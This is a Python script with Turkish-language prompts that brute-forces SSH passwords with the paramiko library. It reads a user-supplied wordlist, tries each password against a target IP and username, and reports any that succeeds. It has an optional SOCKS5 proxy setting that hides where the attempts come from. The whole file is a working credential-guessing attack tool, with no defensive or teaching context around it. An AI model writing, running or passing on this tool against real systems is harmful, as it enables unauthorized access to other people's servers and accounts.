import paramiko
import socks
import socket

def ssh_bruteforce(target_ip, username, password_list, proxy_info=None):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    if proxy_info:
        socks.set_default_proxy(socks.SOCKS5, proxy_info['proxy_ip'], int(proxy_info['proxy_port']))
        socket.socket = socks.socksocket

    with open(password_list, 'r') as passwords:
        for password in passwords:
            password = password.strip()
            try:
                ssh.connect(target_ip, username=username, password=password)
                print(f"[+] Parola bulundu: {password}")
                return
            except paramiko.AuthenticationException:
                print(f"[-] Başarısız deneme: {password}")
            except Exception as e:
                print(f"[!] Hata: {str(e)}")

    print("[!] Parola bulunamadı.")

def main():
    target_ip = input("Hedef IP adresini girin: ")
    username = input("Kullanıcı adını girin: ")
    password_list = input("Wordlist dosya yolunu girin: ")

    use_proxy = input("Proxy kullanmak ister misiniz? (evet/hayır): ").lower()
    proxy_info = None

    if use_proxy == 'evet':
        proxy_ip = input("Proxy IP adresini girin: ")
        proxy_port = input("Proxy portunu girin: ")
        proxy_info = {'proxy_ip': proxy_ip, 'proxy_port': proxy_port}

    ssh_bruteforce(target_ip, username, password_list, proxy_info)

if __name__ == "__main__":
    main()